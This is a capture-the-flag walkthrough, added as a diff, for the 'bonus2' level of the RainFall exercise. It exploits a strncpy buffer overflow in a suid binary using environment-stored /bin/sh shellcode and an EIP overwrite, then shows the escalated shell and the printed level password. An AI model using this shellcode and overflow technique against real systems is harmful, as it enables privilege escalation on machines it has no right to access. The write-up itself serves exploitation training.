@@ -1,0 +1,43 @@
+Once we are logged as bonus2
+
+We are presented with a suid binary.
+
+After analysing the binary it seems that it check for env variable and compare with memcpy to check
+For language to use (fi or nl or eng for default) to greet the user
+
+It's takes two arguments. And uses strncpy to copy them. We can use this to copy the string without the '\0',
+And reproduce a bufferOverflow then overwrite the eip
+
+While using the default language to call the greet function it doesn't give us enough size to overwrite the whole eip address
+
+After trying the other languages we found that "fi" has enough size to do so.
+
+Let's get the shell.
+
+First we will set the language and export a shellcode to our env variables and get it's stack address with this program.
+bonus2@RainFall:~$ export LANG='fi'
+bonus2@RainFall:~$ export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+bonus2@RainFall:~$ cat > /tmp/getv.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+	printf("%s is at %p\n", argv[1], getenv(argv[1]));
+}
+
+
+Then we will reproduce a buffer overflow in strncpy with this command to overwrite the eip with address of env SHELLCODE that
+we got.
+bonus2@RainFall:~$ export LANG="fi"
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xb4\xf8\xff\xbf"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
+$ whoami
+bonus3
+$ ls
+ls: cannot open directory .: Permission denied
+$ cd /home/user/bonus3
+$ cat .pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+And we got the flag for bonus3.
